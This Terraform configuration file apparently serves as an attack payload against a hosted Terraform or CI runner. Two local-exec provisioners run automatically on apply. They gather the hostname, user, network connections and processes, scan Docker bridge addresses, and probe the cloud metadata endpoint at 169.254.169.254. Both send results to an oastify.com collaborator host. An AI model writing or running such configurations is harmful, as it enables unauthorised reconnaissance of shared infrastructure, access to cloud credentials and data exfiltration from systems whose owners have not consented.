# main.tf - Investigate the source
resource "null_resource" "investigate_source" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== INVESTIGATING RANDOM HIT ==="
      echo "Timestamp: $(date)"
      echo "Container: $(hostname)"
      echo "User: $(whoami)"
      
      # Check network connections
      echo "=== NETWORK CONNECTIONS ==="
      netstat -tupn 2>/dev/null || ss -tupn 2>/dev/null
      
      # Check processes
      echo "=== PROCESSES ==="
      ps aux
      
      # Send detailed info to collaborator
      curl -X POST -d "investigation_started=true" -d "container=$(hostname)" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/investigation
    EOT
  }
}

resource "null_resource" "network_scan" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== NETWORK SCAN ==="
      # Scan Docker network for other services
      for ip in 172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.18.0.1 172.19.0.1; do
        ping -c 1 -W 1 $ip 2>/dev/null && echo "Host $ip is alive" && \
        curl -s --connect-timeout 2 http://$ip/ 2>/dev/null && echo " - Has web service" || true
      done
      
      # Check if we can reach internal services
      curl -s http://169.254.169.254/ && echo "AWS metadata accessible"
      
      # Send results
      curl -X POST -d "network_scan_complete=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/scan
    EOT
  }
}
